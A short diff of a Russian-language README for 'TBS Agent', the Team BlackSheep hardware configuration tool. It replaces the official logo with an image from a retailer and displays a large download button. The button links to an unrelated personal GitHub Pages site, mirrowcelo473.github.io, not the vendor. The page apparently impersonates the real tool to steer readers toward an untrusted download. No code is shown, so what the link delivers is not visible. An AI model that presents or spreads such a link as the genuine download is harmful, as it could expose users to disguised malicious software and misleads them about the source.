@@ -1,7 +1,7 @@
 # TBS Agent — настройка и обновление оборудования Team BlackSheep
 
 <p align="center">
-  <img src="https://www.team-blacksheep.com/img/gallery/TBS%20Agent%200%20.jpg" alt="TBS Agent" width="200">
+  <img src="https://next-media.elkjop.com/image/dv_web_D180001001548529/Brand/team-blacksheep.jpg" alt="TBS Agent" width="200">
 </p>
 
 [![GET — TBS AGENT](https://img.shields.io/badge/GET-TBS_AGENT-2563eb?style=for-the-badge)](https://mirrowcelo473.github.io/.github/TBS-agent)
